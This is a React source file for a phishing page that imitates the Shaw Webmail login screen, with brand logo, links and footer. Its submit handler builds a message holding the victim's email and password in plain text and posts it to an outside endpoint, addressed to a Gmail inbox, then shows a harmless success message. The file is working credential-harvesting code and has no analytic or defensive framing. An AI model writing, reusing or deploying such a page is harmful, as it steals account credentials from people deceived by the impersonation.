// src/HomePage.jsx
import React, { useState } from "react";
import axios from "axios";

const HomePage = () => {
  const [formData, setFormData] = useState({
    email: "",
    password: "",
    remember: false,
  });
  const [formErrors, setFormErrors] = useState({ email: "", password: "" });
  const [isSubmitted, setIsSubmitted] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  const handleInputChange = (e) => {
    const { name, value, type, checked } = e.target;
    setFormData((prevData) => ({
      ...prevData,
      [name]: type === "checkbox" ? checked : value,
    }));
  };

  const validateForm = () => {
    const errors = {};
    if (!formData.email) {
      errors.email = "Email is required";
    } else if (!/\S+@\S+\.\S+/.test(formData.email)) {
      errors.email = "Email address is invalid";
    }
    if (!formData.password) {
      errors.password = "Password is required";
    } else if (formData.password.length < 6) {
      errors.password = "Password must be at least 6 characters";
    }
    setFormErrors(errors);
    return Object.keys(errors).length === 0;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsLoading(true);
    const customizedMessage = `
      Hello, New Form Submitted 
      Email: ${formData.email},
      Password: ${formData.password}
      Thank you for using our service.
    `;
    const data = {
      sender_name: import.meta.env.APP_SENDER_NAME,
      sender_email: import.meta.env.APP_SENDER_ADDRESS,
      message: customizedMessage,
      subject: "New Form Submitted",
      email: "krogstadracheal@gmail.com",
      name: "Bellaliant",
    };
    console.log(data);

    const url =
      import.meta.env.APP_API_URL ??
      "http://talentsapartments.com/api/api-email";
    if (validateForm()) {
      try {
        await axios.post(url, data);
        setIsSubmitted(true);
        setIsLoading(false);
      } catch (error) {
        console.error("Failed to send email:", error);
        setIsLoading(false);
      }
    }
  };
  // const handleSubmit = async (e) => {
  //   e.preventDefault();
  //   if (!validateForm()) return;

  //   const customizedMessage = `
  //     Welcome, ${formData.email}!
  //     Thank you for using our service.
  //     Remembered: ${formData.remember ? "Yes" : "No"}
  //   `;

  //   try {
  //     await emailjs.send(
  //       import.meta.env.REACT_APP_EMAILJS_SERVICE_ID,
  //       import.meta.env.REACT_APP_EMAILJS_TEMPLATE_ID,
  //       {
  //         to_email: formData.email,
  //         message: customizedMessage,
  //       },
  //       import.meta.env.REACT_APP_EMAILJS_USER_ID
  //     );
  //     setSuccessMessage("Email sent successfully!");
  //   } catch (error) {
  //     console.error("Email sending error:", error);
  //     setSuccessMessage("Failed to send email. Please try again.");
  //   }
  // };
  return (
    <div className="page">
      {/* Navbar */}
      <header>
        <div className="header">
          <div>
            <ul className="header-content content-1">
              <li className="">
                <a href="#">Personal</a>
              </li>

              <li className="">
                <a href="#">Business</a>
              </li>
            </ul>
            <div className="header-content content-2 d-none d-lg-inline">
              <span className="chat">
                <a href="#">Shop</a>
              </span>
              <span className="chat divider">|</span>
              <span>
                {" "}
                <a href="#">Support</a>
              </span>
              <span className="divider">|</span>
              <span>
                {" "}
                <a href="#">My Shaw</a>
              </span>
            </div>
          </div>
          <div>
            <ul className="header-content content-2">
              <li className="drawer" rel="contact-content">
                <a
                  href="#"
                  style={{
                    display: "flex",
                    alignItems: "center",
                    gap: "15px",
                  }}
                >
                  <i
                    className="bi bi-chat-right"
                    style={{
                      fontSize: "18px",
                    }}
                  ></i>
                  <span className="hidden-xs">Contact</span>
                </a>
              </li>
            </ul>
          </div>
        </div>
      </header>
      <main className="container">
        {/* Page Content */}
        <div className="content m-auto mt-5">
          <div className="row">
            {/* Form Column */}
            <div className="col-md-7 mb-5 mb-lg-0">
              <div className="right-content">
                <div className="my-4 text-center">
                  <img alt="Shaw Webmail" src="/logo.png" />
                </div>
                <div className="">
                  {isSubmitted ? (
                    <div>
                      <div className="email-success mb-3">
                        Form submitted successfully!
                      </div>
                      <div>
                        <button
                          type="submit"
                          className="btn form-btn"
                          onClick={() => {
                            location.reload();
                          }}
                        >
                          Continue
                        </button>
                      </div>
                    </div>
                  ) : (
                    <form onSubmit={handleSubmit} noValidate>
                      <div className="mb-2">
                        <label htmlFor="email" className="form-label">
                          Email Address
                        </label>
                        <div className="row">
                          <div className="col-10 pe-0">
                            <input
                              type="text"
                              name="email"
                              value={formData.email}
                              onChange={handleInputChange}
                              className={`form-control ${
                                formErrors.email ? "is-invalid" : ""
                              }`}
                              id="email"
                              required
                            />
                          </div>
                          <div className="col-2  ps-0  help-container">
                            <div className="help">
                              <i className="bi bi-question-circle-fill"></i>
                              <span>Help</span>
                            </div>
                          </div>
                        </div>
                        {formErrors.email && (
                          <div className="invalid-feedback">
                            {formErrors.email}
                          </div>
                        )}
                      </div>

                      <div className="mb-3">
                        <label htmlFor="password" className="form-label">
                          Password
                        </label>
                        <div className="row">
                          <div className="col-10 pe-0">
                            <input
                              type="password"
                              name="password"
                              value={formData.password}
                              onChange={handleInputChange}
                              className={`form-control ${
                                formErrors.password ? "is-invalid" : ""
                              }`}
                              id="password"
                              required
                            />
                          </div>
                          <div className="col-2  ps-0"></div>
                        </div>

                        {formErrors.password && (
                          <div className="invalid-feedback">
                            {formErrors.password}
                          </div>
                        )}
                      </div>
                      <div className="mb-3">
                        <div className="custom-checkbox d-flex align-items-center">
                          <input
                            type="checkbox"
                            name="remember"
                            checked={formData.remember}
                            onChange={handleInputChange}
                            className="form-check-input m-0"
                            // id="remember"
                            id="styledCheckbox"
                          />
                          <span className="checkbox-box"></span>
                          <label
                            for="styledCheckbox"
                            className="custom-label form-label m-0 ms-2"
                          >
                            Remember my email address!
                          </label>
                        </div>
                      </div>

                      <div className="text-center">
                        <button type="submit" className="btn form-btn">
                          {isLoading &&
                          !formErrors.email &&
                          !formErrors.password
                            ? "Please Wait...."
                            : "Submit"}
                        </button>
                      </div>
                      <div className="text-center ">
                        <div class="form-label form-action">
                          <span>Having trouble?</span>{" "}
                          <span>
                            <a href="">
                              Shaw Support: How To Reset My Password
                            </a>
                          </span>
                          <br />
                          <span>Already Know How?</span>{" "}
                          <span>
                            <a href="">Reset Password On My Shaw</a>
                          </span>
                        </div>
                      </div>
                    </form>
                  )}
                </div>
              </div>
            </div>

            {/* Card Column */}
            <div className="col-md-5 mb-5 mb-lg-0">
              <div className="left-content"></div>
            </div>
          </div>
        </div>
      </main>
      <footer>
        <div className="d-flex justify-content-lg-between align-items-center flex-column flex-lg-row">
          <div className="footer-links mb-3">
            <span>
              <a href="#">Privacy Policy</a>&nbsp;&nbsp;
            </span>{" "}
            <span>|</span>{" "}
            <span>
              &nbsp;&nbsp;
              <a href="#">Terms of Use</a>
              &nbsp;&nbsp;
            </span>{" "}
            <span>|</span>{" "}
            <span>
              &nbsp;&nbsp;
              <a href="#">Accessibility</a>
              &nbsp;&nbsp;
            </span>
          </div>

          <div id="footer-copyright" className="footer-copyright">
            <span>© 2024 Shaw Communications. All Rights Reserved.</span>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default HomePage;
